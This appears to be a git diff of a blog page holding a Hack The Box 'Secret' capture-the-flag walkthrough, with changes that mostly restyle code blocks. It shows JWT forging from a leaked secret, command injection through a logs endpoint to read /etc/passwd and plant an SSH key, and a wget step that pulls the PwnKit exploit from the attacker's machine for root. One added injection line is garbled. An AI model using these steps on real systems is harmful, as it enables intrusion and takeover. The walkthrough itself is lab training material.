@@ -46,7 +46,7 @@
     <div class="wrapper-masthead">
       <div class="container">
         <header class="masthead clearfix">
-          <a href="/" class="site-avatar"><img src="https://github.com/jbreeves/jbreeves.github.io/blob/master/images/self%20portrait.jpg?raw=true" /></a>
+          <a href="/" class="site-avatar"><img src="https://github.com/jbreeves/jbreeves.github.io/blob/main/images/self%20portrait.jpg?raw=true" /></a>
 
           <div class="site-info">
             <h1 class="site-name"><a href="/">Jennifer Reeves</a></h1>
@@ -148,9 +148,9 @@
   <li>Two hidden items in <code class="language-plaintext highlighter-rouge">local-web</code> - <code class="language-plaintext highlighter-rouge">.git</code> and <code class="language-plaintext highlighter-rouge">.env</code>
     <ul>
       <li><code class="language-plaintext highlighter-rouge">.env</code> has the Token <code class="language-plaintext highlighter-rouge">secret</code> in it!
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
-  └─$ ls -la
-  total 116
+        <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+</span><span class="gp">  └─$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">  total 116
   drwxrwxr-x   8 acousticgirl acousticgirl  4096 Sep  3  2021 .
   drwxr-xr-x   3 acousticgirl acousticgirl  4096 Mar 14 22:22 ..
   -rw-rw-r--   1 acousticgirl acousticgirl    72 Sep  3  2021 .env
@@ -166,10 +166,10 @@
   -rw-rw-r--   1 acousticgirl acousticgirl   651 Aug 13  2021 validations.js
                                                                                                                                                                              
   ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
-  └─$ cat .env               
-  DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+</span><span class="gp">  └─$</span><span class="w"> </span><span class="nb">cat</span> .env               
+<span class="go">  DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
   *TOKEN_SECRET = secret*
-</code></pre></div>        </div>
+</span></code></pre></div>        </div>
       </li>
     </ul>
   </li>
@@ -199,49 +199,49 @@
   <li>Attempted user replacement
     <ul>
       <li>Attempt
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl -i -X POST \
+        <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  curl -i -X POST \
 -H 'Content-Type: application/json' \
 -d '{"name":" theadmin", "email":"drt@dasith.works", "password":"testpassword"}' \
 http://10.10.11.120/api/user/register
-</code></pre></div>        </div>
+</span></code></pre></div>        </div>
       </li>
       <li>
         <p>Success! (but not really)</p>
 
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  HTTP/1.1 200 OK
+        <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  HTTP/1.1 200 OK
   Server: nginx/1.18.0 (Ubuntu)
   Date: Tue, 15 Mar 2022 01:59:53 GMT
-  Content-Type: application/json; charset=utf-8
-  Content-Length: 20
+</span><span class="gp">  Content-Type: application/json;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+<span class="go">  Content-Length: 20
   Connection: keep-alive
   X-Powered-By: Express
   ETag: W/"14-LWrfBFPQd+iUl+P35I+Rt9MzQss"
 
   {"user":" theadmin"}
-</code></pre></div>        </div>
+</span></code></pre></div>        </div>
       </li>
       <li>The user was created but it is ` theadmin<code class="language-plaintext highlighter-rouge"> and not </code>theadmin` (notice the leading space). However, they both use the same email address.
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl -i -X POST \
+        <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  curl -i -X POST \
   -H 'Content-Type: application/json' \
   -d '{"email":"drt@dasith.works", "password":"testpassword"}' \
   http://10.10.11.120/api/user/login
-</code></pre></div>        </div>
+</span></code></pre></div>        </div>
       </li>
       <li>
         <p>Successfully logged in with ` theadmin` email and got our JWT:</p>
 
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  HTTP/1.1 200 OK
+        <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  HTTP/1.1 200 OK
   Server: nginx/1.18.0 (Ubuntu)
   Date: Tue, 15 Mar 2022 02:04:48 GMT
-  Content-Type: text/html; charset=utf-8
-  Content-Length: 211
+</span><span class="gp">  Content-Type: text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+<span class="go">  Content-Length: 211
   Connection: keep-alive
   X-Powered-By: Express
   auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJkcnRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3MzA5ODg4fQ.hBPK1WyMZS5Xo1-DYmgN8iJimPStxfc6F1z5_mQp_Ls
   ETag: W/"d3-AbKQ3P+XBBjA9PHtvEjPlyeZqFA"
 
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJkcnRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3MzA5ODg4fQ.hBPK1WyMZS5Xo1-DYmgN8iJimPStxfc6F1z5_mQp_Ls  
-</code></pre></div>        </div>
+</span></code></pre></div>        </div>
       </li>
     </ul>
   </li>
@@ -255,22 +255,22 @@ http://10.10.11.120/api/user/register
 </code></pre></div>    </div>
   </li>
   <li>Lets test our token
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl -X POST http://10.10.11.120:3000/api/user/login
+    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  curl -X POST http://10.10.11.120:3000/api/user/login
  -H "Authorization: Bearer {eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.ZoGUsmIsEESpXWqzWVczp-6ye-tLZzGQ_vciLwbsZjw}"
  -d ‘{“email”:”drt@dasiths.works”,”password”:”testpassword”}’
 
  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
- └─$ curl -i http://10.10.11.120:3000/api/priv 
- HTTP/1.1 401 Unauthorized
+</span><span class="gp"> └─$</span><span class="w"> </span>curl <span class="nt">-i</span> http://10.10.11.120:3000/api/priv 
+<span class="go"> HTTP/1.1 401 Unauthorized
  X-Powered-By: Express
- Content-Type: text/html; charset=utf-8
- Content-Length: 13
+</span><span class="gp"> Content-Type: text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+<span class="go"> Content-Length: 13
  ETag: W/"d-Fke522wB/f0WEQT+w6CDKWhElh4"
  Date: Tue, 15 Mar 2022 03:41:39 GMT
  Connection: keep-alive
 
  Access Denied         
-</code></pre></div>    </div>
+</span></code></pre></div>    </div>
   </li>
   <li>Access is still denied so <code class="language-plaintext highlighter-rouge">secret</code> must not be the correct key for <code class="language-plaintext highlighter-rouge">theadmin</code></li>
 </ul>
@@ -281,42 +281,42 @@ http://10.10.11.120/api/user/register
   <li>
     <p>Let’s look at the git logs to see if anything changed</p>
 
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──(acousticgirl㉿kali)-[~/…/HTB/secret/local-web/.git]
-  └─$ git log                                         
-  commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -&gt; master)
-  Author: dasithsv &lt;dasithsv@gmail.com&gt;
-  Date:   Thu Sep 9 00:03:27 2021 +0530
+    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  ┌──(acousticgirl㉿kali)-[~/…/HTB/secret/local-web/.git]
+</span><span class="gp">  └─$</span><span class="w"> </span>git log                                         
+<span class="gp">  commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -&gt;</span><span class="w"> </span>master<span class="o">)</span>
+<span class="gp">  Author: dasithsv &lt;dasithsv@gmail.com&gt;</span><span class="w">
+</span><span class="go">  Date:   Thu Sep 9 00:03:27 2021 +0530
 
       now we can view logs from server 😃
 
   commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
-  Author: dasithsv &lt;dasithsv@gmail.com&gt;
-  Date:   Fri Sep 3 11:30:17 2021 +0530
+</span><span class="gp">  Author: dasithsv &lt;dasithsv@gmail.com&gt;</span><span class="w">
+</span><span class="go">  Date:   Fri Sep 3 11:30:17 2021 +0530
 
       removed .env for security reasons
 
   commit de0a46b5107a2f4d26e348303e76d85ae4870934
-  Author: dasithsv &lt;dasithsv@gmail.com&gt;
-  Date:   Fri Sep 3 11:29:19 2021 +0530
+</span><span class="gp">  Author: dasithsv &lt;dasithsv@gmail.com&gt;</span><span class="w">
+</span><span class="go">  Date:   Fri Sep 3 11:29:19 2021 +0530
 
       added /downloads
 
   commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
-  Author: dasithsv &lt;dasithsv@gmail.com&gt;
-  Date:   Fri Sep 3 11:27:35 2021 +0530
+</span><span class="gp">  Author: dasithsv &lt;dasithsv@gmail.com&gt;</span><span class="w">
+</span><span class="go">  Date:   Fri Sep 3 11:27:35 2021 +0530
 
       removed swap
-</code></pre></div>    </div>
+</span></code></pre></div>    </div>
 
     <ul>
       <li>
         <p>This line looks promising - <code class="language-plaintext highlighter-rouge">removed .env for security reasons</code> so lets look at that commit</p>
 
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
-  └─$ git log -p  -- .env    
-  commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
-  Author: dasithsv &lt;dasithsv@gmail.com&gt;
-  Date:   Fri Sep 3 11:30:17 2021 +0530
+        <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+</span><span class="gp">  └─$</span><span class="w"> </span>git log <span class="nt">-p</span>  <span class="nt">--</span> .env    
+<span class="go">  commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+</span><span class="gp">  Author: dasithsv &lt;dasithsv@gmail.com&gt;</span><span class="w">
+</span><span class="go">  Date:   Fri Sep 3 11:30:17 2021 +0530
 
       removed .env for security reasons
 
@@ -330,14 +330,14 @@ http://10.10.11.120/api/user/register
   +TOKEN_SECRET = secret
 
   commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
-  Author: dasithsv &lt;dasithsv@gmail.com&gt;
-  Date:   Fri Sep 3 11:25:52 2021 +0530
+</span><span class="gp">  Author: dasithsv &lt;dasithsv@gmail.com&gt;</span><span class="w">
+</span><span class="go">  Date:   Fri Sep 3 11:25:52 2021 +0530
 
       first commit
 
   diff --git a/.env b/.env
   new file mode 100644
-</code></pre></div>        </div>
+</span></code></pre></div>        </div>
       </li>
     </ul>
   </li>
@@ -354,14 +354,14 @@ http://10.10.11.120/api/user/register
     </ul>
   </li>
   <li>Testing the new token
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl http://10.10.11.120:3000/api/priv   -H "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU"
-</code></pre></div>    </div>
+    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  curl http://10.10.11.120:3000/api/priv   -H "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU"
+</span></code></pre></div>    </div>
   </li>
   <li><strong>SUCCESS!</strong>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
- └─$ curl http://10.10.11.120:3000/api/priv   -H "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU"
- {"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}     
-</code></pre></div>    </div>
+    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go"> ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
+</span><span class="gp"> └─$</span><span class="w"> </span>curl http://10.10.11.120:3000/api/priv   <span class="nt">-H</span> <span class="s2">"auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU"</span>
+<span class="go"> {"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}     
+</span></code></pre></div>    </div>
   </li>
 </ul>
 
@@ -369,9 +369,9 @@ http://10.10.11.120/api/user/register
 
 <ul>
   <li>You can query http://10.10.11.120/api/logs as admin and execute commands through index.js which includes an <code class="language-plaintext highlighter-rouge">exec()</code> call.</li>
-  <li>Requests must be URL encoded (I used https://gchq.github.io/CyberChef/ for this)</li>
+  <li>Requests must be URL encoded (I used <a href="https://gchq.github.io/CyberChef/">CyberChef</a> for this)</li>
   <li>You can run the following request to read /etc/passwd
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  http://10.10.11.120/api/logs?file=index.js;cat%20/etc/passwd
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  http://10.10.11.120/api/logs?file=index.js;cat%20/etc/passwdpo;iok
 </code></pre></div>    </div>
   </li>
   <li>Reading /etc/passwd gives you the name of the non-standard user <code class="language-plaintext highlighter-rouge">dasith</code></li>
@@ -380,8 +380,8 @@ http://10.10.11.120/api/user/register
 <h2 id="9-gaining-ssh">9. Gaining SSH</h2>
 <ul>
   <li>Generate a new ssh key for this challenge and label it secret.htb
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ssh-keygen -t rsa -b 4096 -C 'acousticgirl@htb' -f secret.htb -P ''
-</code></pre></div>    </div>
+    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  ssh-keygen -t rsa -b 4096 -C 'acousticgirl@htb' -f secret.htb -P ''
+</span></code></pre></div>    </div>
     <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  - -C is the comment
   - -t is the type
   - -b is the bytes
@@ -393,33 +393,33 @@ http://10.10.11.120/api/user/register
   <code class="language-plaintext highlighter-rouge">export PUBLIC_KEY=$(cat secret.htb.pub)</code>
       - You <strong>must</strong> do this step</li>
   <li>Craft a GET request that adds your <code class="language-plaintext highlighter-rouge">$PUBLIC_KEY</code> contents to /home/dasith/.ssh/authorized_keys on the target machine
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret]
-  └─$ curl \
-  &gt; -i \
-  &gt; -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU' \
-  &gt; -G \
-  &gt; --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY &gt;&gt; /home/dasith/.ssh/authorized_keys" \
-  &gt; 'http://10.10.11.120/api/logs'
-  HTTP/1.1 200 OK
+    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  ┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret]
+</span><span class="gp">  └─$</span><span class="w"> </span>curl <span class="se">\</span>
+  <span class="o">&gt;</span> <span class="nt">-i</span> <span class="se">\</span>
+  <span class="o">&gt;</span> <span class="nt">-H</span> <span class="s1">'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU'</span> <span class="se">\</span>
+  <span class="o">&gt;</span> <span class="nt">-G</span> <span class="se">\</span>
+  <span class="o">&gt;</span> <span class="nt">--data-urlencode</span> <span class="s2">"file=index.js; mkdir -p /home/dasith/.ssh; echo </span><span class="nv">$PUBLIC_KEY</span><span class="s2"> &gt;&gt; /home/dasith/.ssh/authorized_keys"</span> <span class="se">\</span>
+  <span class="o">&gt;</span> <span class="s1">'http://10.10.11.120/api/logs'</span>
+<span class="go">  HTTP/1.1 200 OK
   Server: nginx/1.18.0 (Ubuntu)
   Date: Tue, 15 Mar 2022 18:28:33 GMT
-  Content-Type: application/json; charset=utf-8
-  Content-Length: 27
+</span><span class="gp">  Content-Type: application/json;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+<span class="go">  Content-Length: 27
   Connection: keep-alive
   X-Powered-By: Express
   ETag: W/"1b-pFfOEX46IRaNi6v8ztcwIwl9EF8"
 
   "ab3e953 Added the codes\n" 
-</code></pre></div>    </div>
+</span></code></pre></div>    </div>
   </li>
   <li>Login with SSH
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ssh -i secret.htb dasith@10.10.11.120
-</code></pre></div>    </div>
+    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  ssh -i secret.htb dasith@10.10.11.120
+</span></code></pre></div>    </div>
   </li>
 </ul>
 
 <h2 id="10-user-flag">10. User Flag</h2>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>```
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>```shell_session
 cat user.txt
 d##############################d
 ```
@@ -440,15 +440,15 @@ d##############################d
     </ul>
   </li>
   <li>Investigate /opt/
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  dasith@secret:/tmp$ ls -la /opt
-  total 56
+    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">  dasith@secret:/tmp$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /opt
+<span class="go">  total 56
   drwxr-xr-x  2 root root  4096 Oct  7 10:06 .
   drwxr-xr-x 20 root root  4096 Oct  7 15:01 ..
   -rw-r--r--  1 root root  3736 Oct  7 10:01 code.c
   -rw-r--r--  1 root root 16384 Oct  7 10:01 .code.c.swp
   -rwsr-xr-x  1 root root 17824 Oct  7 10:03 count
   -rw-r--r--  1 root root  4622 Oct  7 10:04 valgrind.log
-</code></pre></div>    </div>
+</span></code></pre></div>    </div>
     <ul>
       <li><code class="language-plaintext highlighter-rouge">valgrind.log</code> contains memory dump information
         <ul>
@@ -488,8 +488,8 @@ d##############################d
 <h2 id="12-root-flag">12. Root Flag</h2>
 <ul>
   <li>Navigate to <code class="language-plaintext highlighter-rouge">/root</code>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  cat root.txt
-  a##############################8
+    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">  cat root.txt
+</span><span class="gp">  a#</span><span class="c">#############################8</span>
 </code></pre></div>    </div>
   </li>
   <li>VICTORY!</li>
@@ -503,10 +503,10 @@ d##############################d
   <li>In the directory that your PwnKit script is in, start an HTTP server with Python
   <code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code></li>
   <li>On victim machine, pull the script down, chmod it to be executable, and run it
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  wget &lt;your ip&gt;/PwnKit
-  chmod +x PwnKit
+    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">  wget &lt;your ip&gt;</span>/PwnKit
+<span class="go">  chmod +x PwnKit
   ./PwnKit
-</code></pre></div>    </div>
+</span></code></pre></div>    </div>
   </li>
   <li>TADA! You are root!</li>
   <li>Proceed to cat /root/root.txt for the root flag.</li>
@@ -554,6 +554,7 @@ d##############################d
 
 
 
+<a href="https://twitch.tvacousticgirl"><i class="svg-icon twitch"></i></a>
         </footer>
       </div>
     </div>
